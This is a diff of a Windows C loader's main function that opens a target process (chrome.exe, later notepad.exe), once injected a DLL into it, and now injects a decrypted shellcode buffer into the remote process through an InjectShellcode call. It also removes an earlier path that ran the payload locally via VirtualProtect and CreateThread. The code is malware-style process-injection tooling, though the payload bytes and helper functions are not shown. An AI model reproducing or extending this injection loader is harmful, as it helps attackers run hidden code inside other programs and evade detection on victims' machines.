@@ -1,21 +1,19 @@
 #include "main.h"
 
-
-
-
-int main(int argc, char *argv[])
+int main()
 {
 	
 	DWORD dwProcessId;
-	HANDLE hProcess =  FetchProcess(L"chrome.exe", &dwProcessId);
-	if (hProcess == INVALID_HANDLE_VALUE) { getchar(); return -1; }
-	if (!InjectDll(hProcess, L".\\DLL.dll")) return -2;
-
+	LPTEXT pText_t;
+	HANDLE hProcess;
+	if ((hProcess = FetchProcess(L"notepad.exe", &dwProcessId)) == INVALID_HANDLE_VALUE) { return -1; }
+	//if (!InjectDll(hProcess, L"C:\\Users\\mikmu\\Desktop\\DLL.dll")) return -2;
+	
 	call();
 	
-	LPTEXT pText_t = Test(argc, argv);
+	if (!(pText_t = Test())) return -5;
 	
-	if (pText_t == NULL) return -5;
+	if (!InjectShellcode(hProcess, (PBYTE)pText_t->pText, pText_t->sText)) return -6;
 
 	/*
 	unsigned char *pK[256] = {'\0'};
@@ -31,13 +29,13 @@ int main(int argc, char *argv[])
 	//printf("[i] Payload in main: %s\n[i] Payload Heap Address: 0x%p\n[!] Decrypting Payload...\n",pText_t->pText, pText_t->pText);
 	*/	
 	
-	DWORD dwOldRights;
+	//DWORD dwOldRights;
 
-	if (!VirtualProtect(pText_t->pText, pText_t->sText, PAGE_EXECUTE_READ, &dwOldRights)) return -2;
+	//if (!VirtualProtect(pText_t->pText, pText_t->sText, PAGE_EXECUTE_READ, &dwOldRights)) return -2;
 
-	DWORD dwThreadPid;
+	//DWORD dwThreadPid;
 
-	HANDLE hThread = CreateThread(NULL, 0, pText_t->pText, NULL, 0, &dwThreadPid);
+	//HANDLE hThread = CreateThread(NULL, 0, pText_t->pText, NULL, 0, &dwThreadPid);
 	
 	WCHAR pPath[MAX_PATH] = { L'\0' };
 
